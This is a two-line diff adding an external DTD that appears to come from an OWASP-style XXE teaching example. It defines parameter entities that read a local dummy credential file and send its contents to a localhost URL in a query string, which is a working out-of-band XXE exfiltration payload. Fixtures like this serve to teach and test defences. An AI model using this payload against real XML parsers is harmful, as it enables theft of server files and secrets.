@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/dummy-credential-xxe.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1:8080/doku-owasp-example/xxe/upload-data-from-evil-external-dtd?content=%file;'>">
